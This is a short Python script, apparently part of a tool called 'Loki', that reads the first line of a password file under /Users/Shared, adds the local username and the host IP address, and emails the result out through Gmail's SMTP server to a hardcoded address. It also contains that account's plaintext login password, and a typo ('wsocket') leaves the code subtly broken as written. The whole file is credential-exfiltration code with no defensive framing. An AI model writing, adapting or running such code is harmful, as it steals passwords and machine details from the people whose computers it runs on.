import smtplib
import getpass
import socket
from email.MIMEMultipart import MIMEMultipart
from email.MIMEText import MIMEText

msg = MIMEMultipart()
msg['From'] = 'th3ta403@gmail.com'
msg['To'] = 'th3ta403@gmail.com'
msg['Subject'] = getpass.getuser()
with open('/Users/Shared/Loki/Password.txt') as f:
    first_line = f.readline ()
message = first_line + "\n" + wsocket.gethostbyname(socket.gethostname())
msg.attach(MIMEText(message))

mailserver = smtplib.SMTP('smtp.gmail.com',587)
mailserver.starttls()
mailserver.ehlo()
mailserver.login('th3ta403@gmail.com', 'Theta403')

mailserver.sendmail('th3ta403@gmail.com','th3ta403@gmail.com',msg.as_string())

mailserver.quit()